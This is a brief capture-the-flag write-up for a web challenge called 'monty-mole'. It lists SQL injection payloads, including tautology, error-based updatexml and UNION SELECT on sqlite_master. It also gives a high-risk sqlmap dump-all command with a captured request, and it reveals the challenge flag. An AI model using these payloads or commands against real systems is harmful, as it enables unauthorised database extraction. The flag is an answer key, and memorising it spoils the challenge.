# monty-mole

After inspecting the source code and seeing this comment: <!-- did you map the sql database? -->
I decidet to try an sql injection.
payloads:
```sql
1' OR 1 = 1 -- -

falied: 1' AND updatexml(null,concat(0x7e,(SELECT secret_password FROM tables LIMIT 1,2)),null)-- -

1' UNION SELECT * FROM sqlite_master WHERE type='table' -- -

1' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='secret_password' -- -

``` 
The second one, even if it failed it triggered the server to show me an error.

After trying a simple sqlmap command I saw I was getting blocked. So I looked up writeups for other sql injections ctfs and found this command:
```sh
> yes | sqlmap -r burp.txt --technique BEUSQ --level 3 --risk 3 --dump-all
```
(in burp.txt I have the request I was making, captured with burp)

Content of burp.txt:
```python
POST / HTTP/1.1
Host: 34.185.205.146:30351
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://34.185.205.146:30351
Connection: keep-alive
Referer: http://34.185.205.146:30351/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

password=aaaaaaa
```

flag: `ctf{27d0f980bd227408d2f46b4dd9fde77f213e3300ca23c366dd18f025e9c47a04}`